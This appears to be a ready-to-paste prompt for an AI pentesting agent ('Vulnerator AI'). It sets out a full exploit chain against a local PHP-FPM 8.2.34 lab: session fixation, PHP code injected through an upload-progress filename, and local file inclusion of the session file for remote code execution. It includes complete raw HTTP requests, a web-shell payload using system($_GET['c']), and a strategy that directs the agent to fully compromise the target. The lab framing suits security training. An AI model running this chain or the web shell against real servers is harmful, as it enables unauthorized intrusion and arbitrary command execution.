# Full prompt for Vulnerator AI — PHP2Shell Lab

This document contains the complete prompt, ready to copy/paste when invoking Vulnerator against this lab.

---

## Engagement context

```
EXPLOITATION engagement in CTF mode against an AUTHORIZED LOCAL lab.

TARGET: http://host.docker.internal:18080
STACK: nginx + PHP-FPM 8.2.34 (SAPI fpm-fcgi)
ENVIRONMENT: controlled lab, localhost, everything authorized

OBJECTIVE: achieve RCE by reproducing CHAIN A of PHP2Shell (CVE-2026-109618 / CVE-2026-109619)
and, as a proof of concept, run `id` on the server.
```

---

## CVEs and affected versions

**CVE-2026-109618** and **CVE-2026-109619**: deserialization vulnerabilities in PHP session handling.

**Affected versions:** PHP 5.4.0 through 8.5.11 (all pre-patch versions)

**Patched versions:**
- PHP 8.2.35+
- PHP 8.3.36+
- PHP 8.4.27+
- PHP 8.5.12+

**Target confirmed vulnerable:** PHP 8.2.34 (pre-patch)

---

## Chain A — Session File Injection + LFI → RCE

### Preconditions (all present on the target)

- `session.upload_progress.enabled = On` ✅ (PHP default)
- `session.upload_progress.cleanup = Off` ✅ (configured in the lab)
- `session.use_strict_mode = Off` ✅ (PHP default)
- **Application with LFI** ✅ (`/vuln.php?page=...`)

### Attack mechanics, step by step

#### STEP 1: Session Fixation

Because `session.use_only_cookies = 0` (default), the PHPSESSID can be fixed by sending it in the **multipart body** in addition to the HTTP cookie.

In the multipart body include:
```
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
```

#### STEP 2: Trigger the upload_progress handler

The multipart request MUST include:

1. A field with `name="PHP_SESSION_UPLOAD_PROGRESS"` (the default `session.upload_progress.name`) with any value, for example `x`.

2. A `file` field with `filename="<payload>"`. **The filename is what is written RAW into the session file.**

Example:
```
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
```

#### STEP 3: Inject the PHP payload into the filename

This is the injection vector. The filename can contain arbitrary PHP code:

```
Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"

dummy
```

Because `cleanup = Off`, the `sess_<SID>` session file persists after the request with the PHP code inside (unsanitized).

**Session file location:** `/tmp/sessions/sess_<PHPSESSID>` (inside the PHP-FPM container)

#### STEP 4: LFI → Execution

The vulnerable endpoint `/vuln.php?page=...` performs `include($_GET['page'])` without sanitization.

Include the session file:
```
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
```

When included, the PHP code from the filename executes.

---

## Full exploitation example

### Request 1: Inject the payload into the session

```http
POST /index.php HTTP/1.1
Host: host.docker.internal:18080
Content-Type: multipart/form-data; boundary=EXPLOIT
Cookie: PHPSESSID=ctfchainA000000000000000000

--EXPLOIT
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
--EXPLOIT
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--EXPLOIT
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']); ?>"

dummy
--EXPLOIT--
```

### Request 2: Trigger the LFI to execute

```http
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
Host: host.docker.internal:18080
```

**Expected result:** the output of the `id` command appears in the HTTP response:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## SCOPE and restrictions

**AUTHORIZED SCOPE:**
- Single target: `http://host.docker.internal:18080` (nginx → PHP-FPM 8.2.34)
- PHP-FPM backend: `host.docker.internal:9000`
- Session save path: `/tmp/sessions/` inside the `php2shell-fpm` container

**PROHIBITED:**
- Any host outside `host.docker.internal`
- Any port other than 18080, 18081, 9000
- Traffic to the internet
- Modification of the host system

**IMPORTANT NOTE:** from the Vulnerator Kali container, use `host.docker.internal` instead of `127.0.0.1` to reach the host's lab. Inside a Docker container, `127.0.0.1` is the container itself, not the host.

---

## Endpoints available on the target

| Endpoint | Description | Relevant for |
|----------|-------------|--------------|
| `/index.php` | Calls `session_start()`, accepts multipart | Chain A (upload) |
| `/vuln.php?page=` | Vulnerable LFI: `include($_GET['page'])` | Chain A (inclusion) |
| `/nosession.php` | Endpoint without session_start() | Negative control |
| `/app/upload.php` | `php_serialize` handler (via `.user.ini`) | Chain C |
| `/api/endpoint.php` | `php` handler (via `.user.ini`) | Chain C |

---

## Success verification

The exploitation is considered successful when:

1. ✅ The second request (LFI) returns the output of the `id` command
2. ✅ The output contains `uid=33(www-data)` (the PHP-FPM process user)
3. ✅ No PHP errors in the response (no warnings, no fatals)

**Example of successful output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Additional technical information

### Relevant PHP configuration

```ini
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off      ← CRITICAL for Chain A
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.save_path = /tmp/sessions
session.use_strict_mode = Off
session.use_only_cookies = 0               ← Allows fixation via POST
memory_limit = 128M                        ← FPM
```

### Lab architecture

```
[Client] → nginx:18080 → PHP-FPM:9000
                         └─ webroot: /var/www/html/
                            └─ sessions: /tmp/sessions/
```

### CVE Timeline

- **Discovery:** January 2026 (ikow research)
- **Public disclosure:** TheHackerNews, January 2026
- **Patches available:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12
- **Lab target:** PHP 8.2.34 (pre-patch, vulnerable)

---

## Useful verification commands

```bash
# Verify the target PHP version
curl http://host.docker.internal:18080/index.php

# Verify session configuration (if phpinfo() is available)
curl http://host.docker.internal:18080/index.php | grep upload_progress

# Send the Chain A exploit with curl (requires manual multipart construction)
# See examples in the lab's TESTING.md
```

---

## Recommended strategy for the agent

1. **OBSERVE:** Enumerate the target
   - Confirm PHP version 8.2.34 (vulnerable)
   - Identify endpoints with `session_start()` (`/index.php`)
   - Identify endpoints with LFI (`/vuln.php?page=`)
   - Confirm `upload_progress.cleanup = Off`

2. **ORIENT:** Analyze the attack surface
   - Chain A is viable: LFI + upload_progress available
   - Reliability: 100%
   - No gadget chains or complex UAF required

3. **DECIDE:** Select Chain A as the vector
   - Lowest complexity compared with other chains
   - All preconditions satisfied
   - Complete documentation available

4. **ACT:** Execute the exploitation
   - Build the multipart with the payload in the filename
   - Fix the PHPSESSID via POST + Cookie
   - Trigger the LFI pointing at the session file
   - Confirm RCE with `id`

5. **REPORT:** Document the finding
   - CVE-2026-109618 / CVE-2026-109619 confirmed
   - RCE obtained as `www-data`
   - Evidence: output of `id`
   - Severity: CRITICAL (pre-auth RCE)
   - Remediation: upgrade to PHP 8.2.35+

---

**MODE: CTF — Authorized full compromise. Objective: confirmed RCE with execution of `id`.**

**LAB: php2shell-lab — PHP 8.2.34 vulnerable environment**

**AUTHORIZATION: Local practice environment. No external systems. All traffic localhost/Docker.**
